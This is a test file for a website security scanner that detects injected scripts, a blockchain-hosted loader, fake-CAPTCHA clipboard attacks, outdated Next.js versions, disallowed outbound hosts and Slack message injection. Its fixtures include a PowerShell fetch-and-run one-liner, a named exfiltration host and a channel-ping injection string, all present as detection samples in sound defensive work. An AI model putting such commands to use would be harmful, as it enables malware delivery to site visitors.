import assert from "node:assert/strict";
import { describe, it } from "node:test";
import {
  buildSlackPayload,
  category,
  compareVersions,
  findMarkers,
  isAllowedOutbound,
  latestPatch,
  nextVersionIn,
  scriptTags,
  stylesheetHrefs,
  worst,
} from "./lib.mjs";

describe("scriptTags", () => {
  it("flags the unquoted src that the October injection used", () => {
    const html =
      '<script src="/_next/static/chunks/main.js" async=""></script><script src=https://www.googletagmanager.com/gtm.js?id=GTM-PJB7D937></script></head>';
    assert.deepEqual(scriptTags(html), [
      { src: "/_next/static/chunks/main.js", quoted: true },
      { src: "https://www.googletagmanager.com/gtm.js?id=GTM-PJB7D937", quoted: false },
    ]);
  });

  it("ignores inline scripts", () => {
    assert.deepEqual(scriptTags('<script>self.__next_f.push([1,"x"])</script>'), []);
  });
});

describe("stylesheetHrefs", () => {
  it("reads only stylesheet links", () => {
    const html =
      '<link rel="icon" href="/icon.svg"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?x"/>';
    assert.deepEqual(stylesheetHrefs(html), ["https://fonts.googleapis.com/css2?x"]);
  });
});

describe("findMarkers", () => {
  it("detects the GTM container and the BSC loader", () => {
    const ids = findMarkers(
      'gtm.js?id=GTM-PJB7D937 var RPC_URLS="https://data-seed-prebsc-1-s1.bnbchain.org:8545/"; method:"eth_call"',
    ).map((m) => m.id);
    assert.deepEqual(ids, ["gtm", "etherhiding"]);
  });

  it("detects a clipboard write that carries a command", () => {
    const ids = findMarkers('navigator.clipboard.writeText("powershell -w h -c iex(irm x)")').map((m) => m.id);
    assert.ok(ids.includes("clipboard-command"));
  });

  it("does not flag a copy-link button", () => {
    assert.deepEqual(findMarkers("await navigator.clipboard.writeText(location.href)"), []);
  });

  it("detects the fake CAPTCHA wording", () => {
    assert.deepEqual(findMarkers("I am not a robot - reCAPTCHA Verification ID: 6876668").map((m) => m.id), ["clickfix-text"]);
  });
});

describe("versions", () => {
  it("reads the Next.js version from a client chunk", () => {
    assert.equal(nextVersionIn('n={version:"15.1.12",appDir:!0}'), "15.1.12");
  });

  it("compares numerically, not as strings", () => {
    assert.equal(compareVersions("15.1.12", "15.1.9"), 1);
    assert.equal(compareVersions("15.1.3", "15.1.12"), -1);
  });

  it("finds the newest stable patch on the same line", () => {
    const versions = ["15.1.3", "15.1.12", "15.1.13", "15.2.0", "15.1.14-canary.1", "16.0.0"];
    assert.equal(latestPatch(versions, "15.1.12"), "15.1.13");
  });
});

describe("isAllowedOutbound", () => {
  const allow = ["127.0.0.1", "*.googleapis.com"];
  it("allows the sidecar on any port and allowed suffixes", () => {
    assert.ok(isAllowedOutbound("127.0.0.1:9999", allow));
    assert.ok(isAllowedOutbound("admin.googleapis.com", allow));
  });
  it("flags the exfiltration host from October", () => {
    assert.equal(isAllowedOutbound("env.qusaeri.com", allow), false);
  });
});

describe("report", () => {
  it("takes the worst status", () => {
    assert.equal(worst(["ok", "warn", "unknown"]), "warn");
    assert.equal(worst(["ok", "danger", "warn"]), "danger");
    assert.equal(worst([]), "ok");
  });

  it("lists dangers first and drops duplicate lines", () => {
    const c = category("x", "X", [
      { status: "ok", text: "a" },
      { status: "danger", text: "b" },
      { status: "danger", text: "b" },
    ]);
    assert.equal(c.status, "danger");
    assert.deepEqual(c.items.map((i) => i.text), ["b", "a"]);
  });

  it("builds one Slack section per category and caps long lists", () => {
    const items = Array.from({ length: 9 }, (_, i) => ({ status: "warn", text: `item ${i}` }));
    const payload = buildSlackPayload({
      siteUrl: "https://example.test",
      date: "2026-10-24",
      runUrl: "",
      categories: [category("a", "A", items), category("b", "B", [{ status: "ok", text: "fine" }])],
    });
    const sections = payload.blocks.filter((b) => b.type === "section");
    assert.equal(sections.length, 3); // summary + 2 categories
    assert.match(sections[1].text.text, /외 3건/);
    assert.match(payload.text, /주의/);
  });

  it("names the project in the header and the notification so several projects can share a channel", () => {
    const categories = [category("a", "A", [{ status: "danger", text: "x" }])];
    const mine = buildSlackPayload({ siteUrl: "https://example.test", date: "2026-11-07", runUrl: "", categories });
    assert.equal(mine.blocks[0].text.text, "🛡️ Tester Match 보안 점검 2026-11-07");
    const other = buildSlackPayload({ projectName: "Knock Knock", siteUrl: "https://example.test", date: "2026-11-07", runUrl: "", categories });
    assert.equal(other.blocks[0].text.text, "🛡️ Knock Knock 보안 점검 2026-11-07");
    assert.equal(other.text, "🔴 Knock Knock 보안 점검 2026-11-07: 위험");
  });

  it("escapes item text so a committed file name cannot ping the channel or fake a link", () => {
    const categories = [category("repo", "R", [{ status: "danger", text: "커밋 abc1234 <!channel>&<https://evil.test|x>.env 개인 키" }])];
    const { blocks } = buildSlackPayload({ siteUrl: "https://example.test", date: "2026-11-07", runUrl: "", categories });
    const line = blocks.at(-1).text.text;
    assert.doesNotMatch(line, /<!channel>|<https:/);
    assert.match(line, /&lt;!channel&gt;&amp;&lt;https:\/\/evil\.test\|x&gt;/);
  });
});
